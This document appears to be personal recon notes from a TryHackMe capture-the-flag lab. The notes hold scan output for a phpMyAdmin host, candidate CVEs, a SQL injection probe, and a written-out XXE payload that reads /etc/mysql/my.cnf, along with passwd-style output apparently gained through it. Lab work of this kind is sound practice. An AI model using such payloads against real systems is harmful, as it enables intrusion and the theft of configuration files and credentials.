
paths:
	/images               (Status: 301) [Size: 311] [--> http://10.10.95.95/images/]
	/assets               (Status: 301) [Size: 311] [--> http://10.10.95.95/assets/]
	/css                  (Status: 301) [Size: 308] [--> http://10.10.95.95/css/]
	/javascript           (Status: 301) [Size: 315] [--> http://10.10.95.95/javascript/]
	/CHANGELOG            (Status: 200) [Size: 832]
	/phpmyadmin           (Status: 301) [Size: 315] [--> http://10.10.95.95/phpmyadmin/]
	/wishes               (Status: 403) [Size: 2260]
	/info (unexplored) use XXE
	
ports:
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
CVE-2022-28615
CVE-2022-23943
CVE-2022-22721	


cms: phpmyadmin - login page - mysql

**
casues error i think - GET /product.php?id=-999.9 UNION 
data mining - /var/www/html/index.js
**

 mysqli_real_connect(): (HY000/1045): Access denied for user '''@'localhost' (using password: YES)
phpmyadmin/",arg_separator:"&",PMA_VERSION:"4.9.5deb2",auth_type:"cookie",user:"root"});
Welcome to the release of phpMyAdmin version 4.9.5. This is a security release containing several bug fixes.

Changes this version: 4.9.5
* PMASA-2020-2 SQL injection vulnerability in the user accounts page, particularly when changing a password
* PMASA-2020-3 SQL injection vulnerability relating to the search feature
* PMASA-2020-4 SQL injection and XSS having to do with displaying results
* Removing of the "options" field for the external transformation.

https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=phpmyadmin

plan:
Use XXE vulnerability to maybe dump mysql db file?
find default path of phpmyadmin mysql db file.
Create XXE payload with said path.

<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/mysql/my.cnf"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>

Users with shells:
root
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
tryhackme:x:1001:1001:,,,:/home/tryhackme:/bin/bash

login-source:
<div class="hide" id="js-https-mismatch">
<div class="error"><img src="themes/dot.gif" title="" alt="" class="icon ic_s_error" /> There is mismatch between HTTPS indicated on the server and client. This can lead to non working phpMyAdmin or a security risk. Please fix your server configuration to indicate HTTPS properly.</div>
</div>
<div class='hide js-show'>    <form method="get" action="index.php" class="disableAjax">
    <input type="hidden" name="db" value="" /><input type="hidden" name="table" value="" /><input type="hidden" name="lang" value="en" /><input type="hidden" name="token" value="5824667d79682762423d497974414841" />

<!-- Login form -->
        <fieldset>
        <legend><input type="hidden" name="set_session" value="hpieo39ml0tqbv01gl7r6en65t" />Log in<a href="./doc/html/index.html" target="documentation"><img src="themes/dot.gif" title="Documentation" alt="Documentation" class="icon ic_b_help" /></a></legend><div class="item">
                <label for="input_username">Username:</label>
                <input type="text" name="pma_username" id="input_username" value="" size="24" class="textfield"/>
            </div>
